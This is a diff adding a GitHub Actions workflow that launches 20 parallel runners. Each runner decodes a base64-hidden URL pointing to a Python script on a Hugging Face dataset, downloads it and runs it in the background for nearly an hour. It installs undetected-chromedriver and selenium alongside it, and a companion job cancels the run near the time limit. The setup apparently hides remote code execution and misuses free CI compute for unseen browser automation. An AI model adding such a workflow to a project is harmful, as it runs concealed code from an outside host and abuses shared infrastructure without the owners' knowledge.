@@ -1,1 +1,91 @@
+name: Zenith Async Grid Supervisor
 
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: zenith-grid-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Terminate Agent: Cancels run after 59 minutes execution span
+  # =================================================================
+  terminate-agent:
+    name: "Terminate Agent"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      SPAN_LIMIT: 3540
+    steps:
+      - name: Launch Count Window
+        run: |
+          echo "[SUPERVISOR] Active run tracking enabled for ID: ${{ github.run_id }}"
+          echo "[SUPERVISOR] Execution boundary set to ${SPAN_LIMIT} seconds."
+
+          sleep "${SPAN_LIMIT}"
+
+          echo "[SUPERVISOR] Interval limit crossed — sending cancellation payload."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[SUPERVISOR] Action revoked successfully."
+
+  # =================================================================
+  # Worker Nodes: Matrix distribution engine
+  # =================================================================
+  grid-nodes:
+    name: "GridNode-Worker-${{ matrix.node_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_id: [y01, t2, t3, t4, 405, 406, 407, h8, 409, 410, 411, d2, 413, 414, 415, 416, 417, 418, 419, 420]
+
+    steps:
+      - name: System Provisioning
+        run: |
+          echo "[HOST] Provisioning Ubuntu instance for Node-${{ matrix.node_id }}..."
+          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip
+
+      - name: Retrieve Payload Script
+        run: |
+          echo "[FETCH] Resolving destination endpoint..."
+          SRC_ENCODED="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          SRC_URL=$(printf '%s' "$SRC_ENCODED" | base64 -d)
+          curl -sL "$SRC_URL" -o grid_worker.py
+          echo "[FETCH] Saved payload to grid_worker.py."
+
+      - name: Build Module Dependencies
+        run: |
+          echo "[PIP] Installing required dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      - name: Execute Node Worker Process
+        run: |
+          echo "[NODE] Running worker script on Node-${{ matrix.node_id }}..."
+
+          python3 grid_worker.py &
+          NODE_PID=$!
+
+          echo "[NODE] Process running in background under PID $NODE_PID. Max window: 3540s."
+
+          sleep 3540
+
+          if kill -0 "$NODE_PID" 2>/dev/null; then
+            echo "[NODE] Upper time limit reached — terminating process."
+            kill -9 "$NODE_PID"
+            echo "[NODE] Process killed."
+          else
+            echo "[NODE] Process finished prior to limit."
+          fi
